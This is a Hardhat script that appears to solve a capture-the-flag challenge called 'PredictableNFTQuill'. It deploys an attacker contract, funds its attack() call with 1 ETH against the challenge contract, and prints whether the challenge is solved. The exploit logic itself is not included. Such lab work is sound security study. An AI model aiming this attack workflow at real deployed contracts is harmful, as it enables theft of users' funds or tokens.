import chalk from "chalk";
import { ethers } from "hardhat";
import { PredictableNFTQuill__factory, PredictableNFTQuill, PredictableNFTQuillAttack__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [pNFTQuillContract, attacker] = await initialize<PredictableNFTQuill>(PredictableNFTQuill__factory);
    let attackContract = await new PredictableNFTQuillAttack__factory(attacker).deploy();
    await attackContract.waitForDeployment();
    let tx = await attackContract.attack(await pNFTQuillContract.getAddress(), {value: ethers.parseEther("1")});
    await tx.wait();
    
    log(`Is solved: ${chalk.yellow(await pNFTQuillContract.isSolved())}`); 
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});